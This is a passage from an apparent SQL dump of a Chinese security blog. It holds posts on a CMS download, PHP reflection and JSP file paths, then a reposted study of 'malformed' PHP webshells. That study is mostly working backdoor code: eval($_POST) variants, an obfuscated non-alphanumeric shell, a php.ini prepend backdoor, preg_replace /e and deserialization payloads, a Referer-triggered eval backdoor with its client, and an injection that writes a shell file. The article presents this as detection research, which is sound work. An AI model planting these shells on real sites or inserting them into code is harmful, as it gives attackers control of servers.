程序下载</strong>：<a href=\"http://pan.baidu.com/s/1pJFaZSR\">oldcms.zip</a> 、<a href=\"https://github.com/010blue/oldcms\">https://github.com/010blue/oldcms</a></p></p>\n<p><p id=\"part6\"><strong>6. 联系方式</strong>：010blue@gmail.com (blue) , QQ交流群：27887508。</p></p>\n<p><p id=\"part7\"><strong>7. 我的其它作品</strong>： <a href=\"http://bluereader.org/\" target=\"_blank\">深蓝阅读</a> <a href=\"http://www.maold.com/\" target=\"_blank\">猫领地</a> (北京近期领养小猫可联系我～)</p></p>', null, '2014-02-16 00:11:42', '1', '784', null, '0', '2014-02-16 00:16:49'), ('696', '1', '5', 'PHP reflection反射应用', '园长', 'Java类反射应用得非常广泛几乎是所有框架的最核心部分，PHP程序员似乎从不关心反射。尝试着用java的思想去理解php的反射，跟java基本上基本一致。参考了php手册：http://www.php.net/manual/zh/book.reflection.php。\n<p>ReflectTest.php:</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\nclass ReflectTest {\n	/**\n	 * 用户ID\n	 */\n	private $userId;\n	/**\n	 * 用户名\n	 */\n	private $userName;\n	/**\n	 * 用户密码\n	 */\n	private $password;\n	/**\n	 * 用户邮箱\n	 */\n	private $email;\n	/**\n	 * 用户QQ号码\n	 */\n	private $qq;\n	/**\n	 * 登陆次数\n	 */\n	private $loginTimes;\n	public function ReflectTest(){\n	}\n	public function __construct($userId,$userName,$password){\n		$this-&gt;userId = $userId;\n		$this-&gt;userName = $userName;\n		$this-&gt;password = $password;\n	}\n	/**\n	 *\n	 * @return the $userId\n	 */\n	public function getUserId() {\n		return $this-&gt;userId;\n	}\n	/**\n	 *\n	 * @return the $userName\n	 */\n	public function getUserName() {\n		return $this-&gt;userName;\n	}\n	/**\n	 *\n	 * @return the $password\n	 */\n	public function getPassword() {\n		return $this-&gt;password;\n	}\n	/**\n	 *\n	 * @return the $email\n	 */\n	public function getEmail() {\n		return $this-&gt;email;\n	}\n	/**\n	 *\n	 * @return the $qq\n	 */\n	public function getQq() {\n		return $this-&gt;qq;\n	}\n	/**\n	 *\n	 * @return the $loginTimes\n	 */\n	public function getLoginTimes() {\n		return $this-&gt;loginTimes;\n	}\n	/**\n	 *\n	 * @param field_type $userId        	\n	 */\n	public function setUserId($userId) {\n		$this-&gt;userId = $userId;\n	}\n	/**\n	 *\n	 * @param field_type $userName        	\n	 */\n	public function setUserName($userName) {\n		$this-&gt;userName = $userName;\n	}\n	/**\n	 *\n	 * @param field_type $password        	\n	 */\n	public function setPassword($password) {\n		$this-&gt;password = $password;\n	}\n	/**\n	 *\n	 * @param field_type $email        	\n	 */\n	public function setEmail($email) {\n		$this-&gt;email = $email;\n	}\n	/**\n	 *\n	 * @param field_type $qq        	\n	 */\n	public function setQq($qq) {\n		$this-&gt;qq = $qq;\n	}\n	/**\n	 *\n	 * @param field_type $loginTimes        	\n	 */\n	public function setLoginTimes($loginTimes) {\n		$this-&gt;loginTimes = $loginTimes;\n	}\n}\n?&gt;</pre>\n<p>Test.php:</p>\n<pre class=\"brush: php; gutter: true\">&lt;?php\n	require_once &#039;ReflectTest.php&#039;;\n	$ref = new ReflectTest(&quot;1&quot;, &quot;admin&quot;, &quot;admin888&quot;);//实例化ReflectTest\n	echo &quot;&lt;h1&gt;ReflectTest init.&lt;/h1&gt;&lt;br/&gt;UserId:&quot;.$ref-&gt;getUserId().&quot;&lt;br/&gt;UserName:&quot;.$ref-&gt;getUserName().&quot;&lt;br/&gt;Password:&quot;.$ref-&gt;getPassword();\n	$class = new ReflectionClass(&#039;ReflectTest&#039;);//反射加载ReflectTest类\n	$instance  = $class-&gt;newInstanceArgs(array(&#039;123&#039;,&#039;root&#039;,&#039;123456&#039;));//ReflectTest初始化\n	echo &quot;&lt;h1&gt;Field:&lt;/h1&gt;&lt;br/&gt;&quot;;\n	$field = $class-&gt;getProperties();\n	foreach($field as $f) {\n		echo $f-&gt;getName().&quot;&lt;br/&gt;&quot;;//反射输出所有的成员变量\n	}\n	echo &quot;&lt;h1&gt;get Fields DocComment:&lt;/h1&gt;&lt;br/&gt;&quot;;\n	foreach($field as $f) {\n		$docComment = $f-&gt;getDocComment();//反射输出所有成员变量的文档注释\n		echo $docComment.&quot;&lt;br/&gt;&quot;;\n	}\n	$method = $class-&gt;getMethods();//获取ReflectTest所有方法\n	echo &quot;&lt;h1&gt;get Methods DocComment:&lt;/h1&gt;&lt;br/&gt;&quot;;\n	foreach($method as $m) {\n		$docComment = $m-&gt;getDocComment();//获取所有方法的文档注释\n		echo $docComment.&quot;&lt;br/&gt;&quot;;\n	}\n	echo &quot;&lt;h1&gt;get Methods:&lt;/h1&gt;&lt;br/&gt;&quot;;\n	foreach($method as $m) {\n		$k = &quot;get&quot;;//只调ReflectTest中的所有的get方法\n		echo $m-&gt;getName().&quot;=&quot;.($k === &quot;&quot; || strpos ( $m-&gt;getName (), $k ) === 0?$m-&gt;invoke($instance):&quot;&quot;).&quot;&lt;br/&gt;&quot;;\n		if(&quot;setQq&quot;==$m-&gt;getName()){\n			$m-&gt;invoke($instance,&#039;441637262&#039;);//调用setQq方法为ReflectTest当中的成员变量qq设值\n		}\n	}\n	echo &quot;&lt;h1&gt;Invoke (set/get)Qq result:&lt;/h1&gt;&lt;br/&gt;&quot;;\n	$qq=$class-&gt;getmethod(&#039;getQq&#039;);//获取getQq方法\n	echo &quot;getQQ:&quot;.$qq-&gt;invoke($instance).&quot;&lt;br/&gt;&quot;;//获取成员变量qq的值\n	echo &quot;p2j.cn&quot;;\n?&gt;</pre>\n<p><strong>请求http://localhost/php/test/Test.php输出结果：</strong></p>\n<pre class=\"brush: php; gutter: true\">ReflectTest init.\nUserId:1\nUserName:admin\nPassword:admin888\nField:\nuserId\nuserName\npassword\nemail\nqq\nloginTimes\nget Fields DocComment:\n/** * 用户ID */\n/** * 用户名 */\n/** * 用户密码 */\n/** * 用户邮箱 */\n/** * 用户QQ号码 */\n/** * 登陆次数 */\nget Methods DocComment:\n/** * * @return the $userId */\n/** * * @return the $userName */\n/** * * @return the $password */\n/** * * @return the $email */\n/** * * @return the $qq */\n/** * * @return the $loginTimes */\n/** * * @param field_type $userId */\n/** * * @param field_type $userName */\n/** * * @param field_type $password */\n/** * * @param field_type $email */\n/** * * @param field_type $qq */\n/** * * @param field_type $loginTimes */\nget Methods:\nReflectTest=\n__construct=\ngetUserId=123\ngetUserName=root\ngetPassword=123456\ngetEmail=\ngetQq=\ngetLoginTimes=\nsetUserId=\nsetUserName=\nsetPassword=\nsetEmail=\nsetQq=\nsetLoginTimes=\nInvoke (set/get)Qq result:\ngetQQ:441637262\np2j.cn</pre>', null, '2014-02-16 02:59:41', '1', '2793', null, '0', '2014-02-16 03:01:08'), ('711', '1', '3', 'jsp获取真实或虚拟文件绝对路径', '园长', '更新：推荐使用 <a href=\"http://javaweb.org/?p=1239\">javaweb 获取请求文件绝对路径问题-getServletPath();</a>\n<p>google和baidu能找到的就没有一个写法是正确的，当遇到webapps目录或者自定义context的没一个能获取比较准确的方法。</p>\n<p>code:</p>\n<pre class=\"brush: java; gutter: true\">	public String getRequestFileRealPath(HttpServletRequest request){\n		String webRoot = (request.getSession().getServletContext().getRealPath(&quot;/&quot;).replaceAll(&quot;\\\\\\\\&quot;, &quot;/&quot;)+&quot;/&quot;).replaceAll(&quot;/+&quot;, &quot;/&quot;),\n			   context = request.getContextPath(), \n			   uri = request.getRequestURI().replaceAll(&quot;/+&quot;, &quot;/&quot;),\n			   filePath = (webRoot+uri).replaceAll(&quot;/+&quot;, &quot;/&quot;);\n		if(!&quot;&quot;.equals(context)&amp;&amp;webRoot.endsWith(context+&quot;/&quot;)){\n			return webRoot.substring(0,webRoot.indexOf(context))+uri;\n		}else{\n			if(uri.split(&quot;/&quot;).length&gt;1){\n				String[] c = uri.split(&quot;/&quot;);\n				if(!new File(webRoot+c[1]).exists()){\n					return (webRoot+(uri.replaceFirst(c[1], &quot;&quot;))).replaceAll(&quot;/+&quot;, &quot;/&quot;);\n				}\n			}\n		}\n		return filePath;\n	}</pre>', null, '2014-02-19 18:05:09', '1', '622', null, '0', '2014-05-05 15:01:19'), ('729', '5', '14', '[cnblogs-.Little Hann]各种畸形WEBSHELL学习(1) -- WebShell攻防对抗系列学习', 'Anonymous', 'FROM：<a href=\"http://www.cnblogs.com/LittleHann/p/3522990.html\">各种畸形WEBSHELL学习(1) -- WebShell攻防对抗系列学习</a>\n<p>作为WebShell检测、CMS修复、WebShell攻防研究学习的第一篇文章</p>\n<p>本文旨在研究Webshell的各种猥琐编写方式以及webshell后门的生成、检测技术，主要分享了一些webshell的编写方法以及当前对webshell的识别、检测技术的原理以及相应工具的使用，希望能给研究这一领域的朋友带来一点点帮助，同时抛砖引玉，和大家共同讨论更多的技术细节，共同学习成长</p>\n<p>文章主要分为3部分</p>\n<pre class=\"brush: php; gutter: true\">1. webshell原理介绍\n2. webshell的常见类型以及变种方法\n3. webshell的检测原理以及检测工具</pre>\n<p>1. 相关学习资料</p>\n<p><a title=\"http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63\" href=\"http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63\" target=\"_blank\">http://hi.baidu.com/monyer/item/a218dbadf2afc7a828ce9d63</a></p>\n<p><a title=\"http://drops.wooyun.org/tips/839\" href=\"http://drops.wooyun.org/tips/839\" target=\"_blank\">http://drops.wooyun.org/tips/839</a></p>\n<p><a title=\"http://1.lanz.sinaapp.com/?p=3\" href=\"http://1.lanz.sinaapp.com/?p=3\" target=\"_blank\">http://1.lanz.sinaapp.com/?p=3</a></p>\n<p><a title=\"http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/ \" href=\"http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/%20\" target=\"_blank\">http://www.thespanner.co.uk/2011/09/22/non-alphanumeric-code-in-php/</a></p>\n<p><a title=\"http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html \" href=\"http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html%20\" target=\"_blank\">http://blog.sucuri.net/2011/09/ask-sucuri-what-about-the-backdoors.html</a></p>\n<p><a title=\"http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html\" href=\"http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html\" target=\"_blank\">http://www.php-security.org/2010/05/20/mops-submission-07-our-dynamic-php/index.html</a></p>\n<p><a title=\"http://www.freebuf.com/articles/web/11403.html\" href=\"http://www.freebuf.com/articles/web/11403.html\" target=\"_blank\">http://www.freebuf.com/articles/web/11403.html</a></p>\n<p><a title=\"http://zone.wooyun.org/content/5429\" href=\"http://zone.wooyun.org/content/5429\" target=\"_blank\">http://zone.wooyun.org/content/5429</a></p>\n<p><a href=\"https://www.virustotal.com/\">https://www.virustotal.com/</a></p>\n<p><a title=\"http://www.8090sec.com/suixinbiji/111568.html\" href=\"http://www.8090sec.com/suixinbiji/111568.html\" target=\"_blank\">http://www.8090sec.com/suixinbiji/111568.html</a></p>\n<p><a href=\"http://blog.d99net.net/article.asp?id=435\">http://blog.d99net.net/article.asp?id=435</a></p>\n<p>1. webshell原理介绍</p>\n<p>来自百度百科的定义:</p>\n<pre class=\"brush: php; gutter: true\">WebShell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将这些asp或php后门文件与网站服务器\nWEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问这些asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的（可以上传下载文件，查看数据库，执行任意程序\n命令等）</pre>\n<p>也就是说，webshell也就是一些\"正常\"的脚本文件(这里说它正常，是从文本的角度来说的)，而webshell的恶意性则是表现在它的实现功能上的，也叫Back Door，是一段带有恶意目的的正常脚本代码(Mareware)</p>\n<p>在开始学习webshell的各种奇技淫巧之前，我们要先了解一个基本概念，即webshell的组成，下面是引用Monyer的一篇文章:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/11.png\"><img class=\"alignnone size-medium wp-image-730\" title=\"1\" src=\"http://javaweb.org/wp-content/uploads/2014/02/11-300x82.png\" alt=\"\" width=\"300\" height=\"82\" /></a></p>\n<p>还有一张是来自drops的一篇paper:</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/02/21.png\"><img class=\"alignnone size-medium wp-image-731\" title=\"2\" src=\"http://javaweb.org/wp-content/uploads/2014/02/21-300x132.png\" alt=\"\" width=\"300\" height=\"132\" /></a></p>\n<p>即不管webshell的外形怎么改变，它的基本骨架都符合这个结构，即WebShell的实现需要两步：</p>\n<pre class=\"brush: php; gutter: true\">1. 数据的传递\n2. 执行所传递的数据</pre>\n<p>根据这两个基本点，webshell可以衍生出很多种写法</p>\n<pre class=\"brush: php; gutter: true\">1. 数据的传递:\n　　1) $_GET、$_POST、$_COOKIES、$_FILE...(HTTP包中的任何位置都可以作为payload的传输媒介)\n　　2) 从远程远程URL中获取数据: file_get_contents、curl、svn_checkout...(将需要执行的指令数据放在远程URL中，通过URL_INCLUDE来读取)\n　　3) 从磁盘文件中获取数据: file、file_get_contents...(将需要执行的指令数据放在磁盘文件中，利用IO函数来读取)\n　　4) 从数据库中读取(将需要执行的指令放在数据库中，利用数据库函数来读取)\n　　5) 从图片头部中获取: exif_read_data...(将需要执行的指令数据放在图片头部中，利用图片操作函数来读取)\n2. 代码执行(将用户传输的数据进行执行)\n　　1) eva、system...l执行(这是最普通、标准的代码执行)\n　　2) LFI: include、require...(利用浏览器的伪协议将文件包含转化为代码执行)\n　　3) 动态函数执行($()...PHP的动态函数特性)\n　　4) Curly Syntax(${${...}}...这种思路可以把变量赋值的漏洞转化为代码执行的机会)</pre>\n<p>关于webshell的防御，这里我的理解应该做一下区分:</p>\n<pre class=\"brush: php; gutter: true\">webshell有三大类的问题:\n    1) 由一些CMS应用系统的漏洞导致的getshell，攻击者在注入攻击的那一瞬间进行getshell，这类webshell的防御主要是在对原有应用系统的代码审查上，审核原有的应用系统的代码中\n　　　　是否存在可能导致getshell的&quot;不安全代码&quot;\n    2) 对攻击者写入的webshell代码本身的检测，我们需要了解黑客都会使用哪些种类的奇技淫巧的webshell编写方式，并对这类文件的操作行为进行监控并进行报告\n    3) 还有一种假设的前提是黑客已经获得了一定的对目标服务器的控制权限，黑客为了后续的访问，会留下逻辑后门。这种逻辑后门可以很宽泛的理解一下: \n        3.1) 人工故意放置一个带注入点的文件，并放上正常的文件内容，增加迷惑性，让扫描工具工具和管理员看起来像正常文件\n        3.2) 修改服务器配置文件：\n　　　　　　　　1) .htaceess，修改某些扩展名的执行权(例如手工添加 .fackType PHP 这种映射关键的建立).\n　　　　　　　　　　SetHandler application/x-httpd-php: 添加jpg和PHP解析引擎的映射\n　　　　　　　　2) 建立一种逻辑后门。或在php.ini中设置auto_preload来预加载.php脚本，放置后门代码\n        3.3) 修改CMS的配置，放行某些(.php、.asp)的上传权限\n        3.4) 人工设置几个包含容易导致漏洞的代码的脚本文件(LFI、命令执行等)</pre>\n<p>2.  webshell的常见类型以及变种方法</p>\n<p>接下来分别列出我所遇到过的PHP webshell的写法</p>\n<pre class=\"brush: php; gutter: true\">0x1:  php.ini隐藏后门\n在php.ini 中添加:\n; Automatically add files before PHP document.\n; http://php.net/auto-prepend-file\nauto_prepend_file = choop.php\n; (auto_prepend_file是在任意PHP脚本的头部)\n; (auto_append_file是在任意PHP脚本的尾部)\n; (不管头部还是尾部，webshell都能被正常执行)\n; LittleHann\ninclude_path = &quot;E:\\wamp\\www\\shell;.&quot;\n;我们所要include的文件目录放在根目录的前边。不然的话apache会在根目录下搜索我们的后门(当然是没有了从而导致服务器解析php文件失败)\n在&quot;E:\\wamp\\www\\shell&quot;中创建 choop.php: &lt;?php eval($_POST[1]); ?&gt;\n这样可以将webshell藏在磁盘上的任意位置，不一定是要web目录，然后在整个服务器运行期间放置后门</pre>\n<pre class=\"brush: php; gutter: true\">0x2: 利用PHP动态变量特性\n&lt;?php\n    //@eval($_POST[&#039;op&#039;]);\n    @eval(${&quot;_P&quot;.&quot;OST&quot;}[&#039;op&#039;]);\n?&gt;\n//使用注释符来规避基于黑名单的正则\n&lt;?php\n    //@eval($_POST[&#039;op&#039;]);\n    @eval($/*aaa*/{&quot;_P&quot;.&quot;OST&quot;}[&#039;op&#039;]);\n?&gt;\n使用其他数据获取方式来获取数据，譬如$_REQUEST、$GLOBALS[&quot;_POST&quot;]、$_FILES等。\n&lt;?php\n    @eval($_REQUEST[&#039;op&#039;]);\n?&gt;\n$_REQUEST 中的变量通过 GET，POST 和 COOKIE 输入机制传递给脚本文件。这个数组的项目及其顺序依赖于 PHP 的variables_order 指令的配置。\n&lt;?php\n    @eval($GLOBALS[&#039;_POST&#039;][&#039;op&#039;]);\n?&gt;\n&lt;?php\n    @eval($_FILE[&#039;name&#039;]);\n?&gt;\n(然后把payload写在文件名中)</pre>\n<pre class=\"brush: php; gutter: true\">0x3: tiny php shell\n前提是对方的服务器的php.ini开启了\nshort_open_tag = On\n&lt;?=($_=@$_GET[2]).@$_($_GET[1])?&gt;\nhttp://localhost/shell/choop.php?2=system&amp;1=dir</pre>\n<pre class=\"brush: php; gutter: true\">0x4: Non alphanumeric webshell\n&lt;?php\n$_=&quot;&quot;;\n$_[+$_]++;\n$_=$_.&quot;&quot;;\n$___=$_[+&quot;&quot;];//A\n$____=$___;\n$____++;//B\n$_____=$____;\n$_____++;//C\n$______=$_____;\n$______++;//D\n$_______=$______;\n$_______++;//E\n$________=$_______;\n$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;$________++;//O\n$_________=$________;\n$_________++;$_________++;$_________++;$_________++;//S\n$_=$____.$___.$_________.$_______.&#039;6&#039;.&#039;4&#039;.&#039;_&#039;.$______.$_______.$_____.$________.$______.$_______;\n$________++;$________++;$________++;//R\n$_____=$_________;\n$_____++;//T\n$__=$___.$_________.$_________.$_______.$________.$_____;\n$__($_(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));   \n//ASSERT(BASE64_DECODE(&quot;ZXZhbCgkX1BPU1RbMV0p&quot;));\n//ASSERT(&quot;eval($_POST[1])&quot;);\n//key:=1\n?&gt;</pre>\n<pre class=\"brush: php; gutter: true\">0x5: 图片木马\nchoop.php:\n&lt;?php\n    $wp__theme_icon=create_function(&#039;&#039;,file_get_contents(&#039;/hacker.gif&#039;));\n    $wp__theme_icon();\n?&gt;\nhacker.gif:\nphpinfo();\n这是图片木马的利用方式的一种)\nhttp://www.php.net/manual/zh/function.create-function.php\nstring create_function ( string $args , string $code )\n但是这种方法的利用有一个问题，不能像include那样有兼容性，include的情况是允许include进来的语句有错误，PHP会忽略这些错误，而去执行include进来的有效PHP代码\n而create_function(&#039;&#039;,file_get_contents(&#039;/hacker.gif&#039;)); 这种方法不允许图片中有非法数据(其实就是真实的图片数据)，否则就会出现解析错误，所以黑客只能把纯的木马脚本\n保存成图片格式而已，这样就可能导致无法绕过图片上传防御机制</pre>\n<pre class=\"brush: php; gutter: true\">0x6: preg_replace的&quot;/e&quot;执行特性\n&lt;?php\n    $subject=&#039;any_thing_you_can_write&#039;;\n    $pattern=&quot;/^.*$/e&quot;;\n    $payload=&#039;cGhwaW5mbygpOw==&#039;;\n    //cGhwaW5mbygpOw==: &quot;phpinfo();&quot;\n    $replacement=pack(&#039;H*&#039;, &#039;406576616c286261736536345f6465636f646528&#039;).&quot;\\&quot;$payload\\&quot;))&quot;;\n    //406576616c286261736536345f6465636f646528: &quot;eval(base64_decode(&quot;;\n    preg_replace($pattern, $replacement , $subject);\n?&gt;\nPHP pack() 函数，基本上和数据类型的转换是一个类型的函数\nhttp://www.w3school.com.cn/php/func_misc_pack.asp\npreg_replace — 执行一个正则表达式的搜索和替换\nhttp://cn2.php.net/manual/zh/function.preg-replace.php\nmixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )\n搜索subject中匹配pattern的部分， 以replacement进行替换。\n当使用e修饰符时, 引擎会将&quot;结果字符串&quot;作为php代码使用eval方式进行评估并将返回值作为最终参与替换的字符串。\n这个webshell的利用方式的核心在于:\n1. 这个PHP函数: preg_replace，它完成了eval的功能\n2. 这个pack函数，它完成了eval(base64_decode(...和shellcode_payload的拼接</pre>\n<pre class=\"brush: php; gutter: true\">0x7: 字符串拼接+PHP的动态函数执行\n&lt;?php\n    $char_as=&#039;as&#039;;\n    $char_e=&#039;e&#039;;\n    $char_assert=$char_as.&#039;s&#039;.$char_e.&#039;r&#039;.&#039;t&#039;;\n    $char_base64_decode=&#039;b&#039;.$char_as.$char_e.(64).&#039;_&#039;.&#039;d&#039;.$char_e.&#039;c&#039;.&#039;o&#039;.&#039;d&#039;.$char_e;\n    @$char_assert(@$char_base64_decode(&#039;ZXZhbCgkX1BPU1RbMV0p&#039;));\n    //ZXZhbCgkX1BPU1RbMV0p: &quot;eval($_POST[1])&quot;\n?&gt;</pre>\n<pre class=\"brush: php; gutter: true\">0x8: Curly Syntax\n&amp;lt;?php \n    $k = &quot;{${phpinfo()}}&quot;;\n?&amp;gt;\n&amp;lt;?php \n   $xsser = $_GET[&quot;op&quot;]; \n   @eval(&quot;\\$safedg = $xsser;&quot;) \n?&amp;gt;\nhttp://localhost/shell/index.php?op=${${fputs(fopen(&quot;LittleHann.php&quot;, &quot;w+&quot;), &quot;&amp;lt;?php eval(\\$_POST[1]);?&amp;gt;LittleHann&quot;)}};\n这个利用方式很巧妙，这种注入的利用场景是假如应用系统的输入点存在注入点，并且这个输入有机会到达代码的某个变量赋值的代码流位置，黑客可以利用这次&quot;&lt;strong&gt;变量赋值&lt;/strong&gt;&quot;进行一次&quot;&lt;strong&gt;代码执行&lt;/strong&gt;&quot;</pre>\n<pre class=\"brush: php; gutter: true\">0x9: 逻辑后门\n&lt;?php\n    foreach ($_GET as $key =&gt; $value)\n    {\n        //由攻击者添加\n        $$key = $value;\n    }\n    // ... some code\n    if (logged_in() || $authenticated)\n    {\n        //原有逻辑\n        // ... administration area\n    }\n?&gt;\n或者增加逻辑\nif($user_level==ADMIN || $user_name==’monyer’)\n{\n    //admin area\n}\n或者增加配置\n$allow_upload = array(\n             ‘jpg’,’gif’,’png’,\n             ‘php’,\n        );\n这和拿到CMS后台，然后修改&quot;可允许上传文件类型&quot;，增加.php的做法类似，这是一种&quot;后门思想&quot;\n这里的情况是黑客已经控制了服务器的一定控制权，在服务器上留后门，黑客可以手动添加这段代码，人工构造本地变量覆盖漏洞，然后黑客在下次攻击的时候就可以进行变量注入，\n进而控制原始的代码流\n在其他的情况下\n在代码中，常常在if()这样的关键跳的位置根据变量进行代码流向判断，而如果应用系统存在任意变量覆盖漏洞，就有可能导致系统本地原本的变量被覆盖，进而导致代码流被黑客控制</pre>\n<pre class=\"brush: php; gutter: true\">0xA: LFI导致的代码执行\n&lt;?php\n    $to_include = $_GET[&#039;file&#039;];\n    require_once($to_include);\n?&gt;\n这种LFI可能导致黑客将文件包含漏洞升级为代码执行漏洞\nhttp://localhost/shell/index.php?file=data:text/plain,&lt;?php phpinfo();?&gt;\nhttp://tools.ietf.org/html/rfc2397\ndata:[&lt;mediatype&gt;][;base64],&lt;data&gt;\n或者\neval(file_get_contents(&#039;php://input&#039;));</pre>\n<pre class=\"brush: php; gutter: true\">0xB: 动态函数执行\n&lt;?php\n    $dyn_func = $_GET[&#039;dyn_func&#039;];\n    $argument = $_GET[&#039;argument&#039;];\n    $dyn_func($argument);\n?&gt;\nhttp://localhost/shell/index.php?dyn_func=system&amp;argument=dir\n如果目标服务器开启了: register_globals=on\n则webshell还可以这么写\n&lt;?php\n    $dyn_func($argument);\n?&gt;\nhttp://localhost/shell/index.php?dyn_func=system&amp;argument=dir\n但是register_globals这个选项在PHP5.0以后就取消了，即不管php.ini中写On还是Off都没有任何意义</pre>\n<pre class=\"brush: php; gutter: true\">0xC: PHP动态创建匿名函数(Lamda表达式)\n除了动态变量直接动态执行函数，PHP还允许使用create_function动态的进行&quot;匿名函数(Lamda)&quot;的创建\nhttp://cn2.php.net/manual/zh/function.create-function.php\nstring create_function ( string $args , string $code )\n&lt;?php\n    $foobar = $_GET[&#039;foobar&#039;];\n    $dyn_func = create_function(&#039;$foobar&#039;, &quot;echo $foobar;&quot;);\n    $dyn_func(&#039;&#039;);\n?&gt;\nhttp://localhost/shell/index.php?foobar=system(&#039;dir&#039;)\n或者\nhttp://localhost/shell/index.php?foobar=eval(&#039;phpinfo();&#039;)\n动态函数的另一种写法：\n&lt;?php\n    eval(&quot;function lambda_n() { echo system(&#039;dir&#039;); }&quot;);\n    lambda_n();\n?&gt;\n&lt;?php\n    eval(&quot;function lambda_n() { eval($_GET[1]); }&quot;);\n    lambda_n();\n?&gt;\nhttp://localhost/shell/index.php?1=phpinfo()\n这里之所以可以使用create_function是因为在PHP内部 create_function() 只是对 eval()的一层封装，它最终还是使用eval()进行代码执行的</pre>\n<pre class=\"brush: php; gutter: true\">0xD: 利用系统输出缓存的方法\n&lt;?php\n    $foobar = &#039;system&#039;;\n    ob_start($foobar);\n    echo &quot;dir c:&quot;;\n    ob_end_flush();\n?&gt;\nhttp://cn2.php.net/manual/zh/function.ob-start.php\nob_start()会把自己接收到的字符串当作一个&quot;回调函数callback_func&quot;，并将接下来的缓冲区输入，当作这个&quot;回调函数&quot;的参数</pre>\n<pre class=\"brush: php; gutter: true\">0xE: 利用assert()断言来进行代码执行\n&lt;?php\n    $foobar = &#039;system(&quot;dir&quot;)&#039;;\n    assert($foobar);\n?&gt;\nhttp://cn2.php.net/manual/zh/function.assert.php\n1. 断言这个功能应该只被用来调试\n2. 你应该用于完整性检查时测试条件是否始终应该为 TRUE\n3. 来指示某些程序错误\n4. 或者检查具体功能的存在(类似扩展函数或特定的系统限制和功能)</pre>\n<pre class=\"brush: php; gutter: true\">0xF: 数组映射(xxx_map)类型函数的处理后回调机制导致的代码执行\narray_map()\nusort(),            　　　　　　uasort(),            　　　　uksort()\narray_filter()\narray_reduce()\narray_diff_uassoc(),        　array_diff_ukey()\narray_udiff(),            　　array_udiff_assoc(),        array_udiff_uassoc()\narray_intersect_assoc(),    　array_intersect_uassoc()\narray_uintersect(),        　array_uintersect_assoc(),    array_uintersect_uassoc()\narray_walk(),            　　array_walk_recursive()\n&lt;?php\n    $evil_callback = $_GET[&#039;callback&#039;];\n    $some_array = array(0, 1, 2, 3);\n    $new_array = array_map($evil_callback, $some_array);\n?&gt;\nhttp://localhost/shell/index.php?callback=phpinfo\nXML的解析也同样存在这个的映射回调问题\nxml_set_character_data_handler()\nxml_set_default_handler()\nxml_set_element_handler()\nxml_set_end_namespace_decl_handler()\nxml_set_external_entity_ref_handler()\nxml_set_notation_decl_handler()\nxml_set_processing_instruction_handler()\nxml_set_start_namespace_decl_handler()\nxml_set_unparsed_entity_decl_handler()\nstream_filter_register()\nset_error_handler()\nregister_shutdown_function()\nregister_tick_function()</pre>\n<pre class=\"brush: php; gutter: true\">0x20: PHP的序列化、反序列化特性布置后门\n&lt;?php\n    class Example\n    {\n       var $var = &#039;&#039;;\n       function __destruct()\n       {\n          eval($this-&gt;var);\n       }\n    }\n    //$exp =  new Example();\n    //$exp-&gt;var = &quot;phpinfo();&quot;;\n    //die(serialize($exp));\n    unserialize($_GET[&#039;saved_code&#039;]);\n?&gt;\nO:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}  \nhttp://localhost/shell/index.php?saved_code=O:7:&quot;Example&quot;:1:{s:3:&quot;var&quot;;s:10:&quot;phpinfo();&quot;;}  \n原理是: 被序列化的对象在反序列化的时候会自动调用它的析构函数</pre>\n<pre class=\"brush: php; gutter: true\">0x21: 使用HTTP头部的其他非常用字段进行指令的传输\n通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果。\nbackdoor:\n&lt;?php\n    header(&#039;Content-type:text/html;charset=utf-8&#039;);\n    //将$_SERVER[&#039;HTTP_REFERER&#039;]中的参数解析到本地变量中，放到$a数组中\n    parse_str($_SERVER[&#039;HTTP_REFERER&#039;], $a);\n    //判断数组变量$a中的第一个元素是否是&quot;10&quot;、并且数组元素个数是否是9个\n    if(reset($a) == &#039;10&#039; &amp;&amp; count($a) == 9)\n    {    \n        //取出数组$a中索引6的元素，即我们传入的实际payload，并进行base64_decode解码\n        eval(base64_decode(str_replace(&quot; &quot;, &quot;+&quot;, implode(array_slice($a, 6)))));\n    }\n?&gt;\n利用方式:\n&lt;?php\n    header(&#039;Content-type:text/html;charset=utf-8&#039;);\n    //要执行的代码\n    $code = &quot;phpinfo();&quot;;\n    //进行base64编码\n    $code = base64_encode($code);\n    //构造referer字符串\n    $referer = &quot;a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g={$code}&amp;h=&amp;i=&quot;;\n    //后门url\n    $url = &#039;http://localhost/shell/index.php&#039;;\n    $ch = curl_init();\n    $options = array(\n        CURLOPT_URL =&gt; $url,\n        CURLOPT_HEADER =&gt; FALSE,\n        CURLOPT_RETURNTRANSFER =&gt; TRUE,\n        CURLOPT_REFERER =&gt; $referer\n    );\n    curl_setopt_array($ch, $options);\n    echo curl_exec($ch);\n?&gt;\n原理分析：\nhttp://www.php.net/manual/zh/function.parse-str.php\n和extract()作用类似，将外部传入的参数注册为本地变量\nhttp://www.w3school.com.cn/php/func_array_reset.asp\nreset() 函数把数组的内部指针指向第一个元素，并返回这个元素的值\nhttp://www.w3school.com.cn/php/func_array_slice.asp\narray_slice(array,offset,length,preserve)\narray_slice() 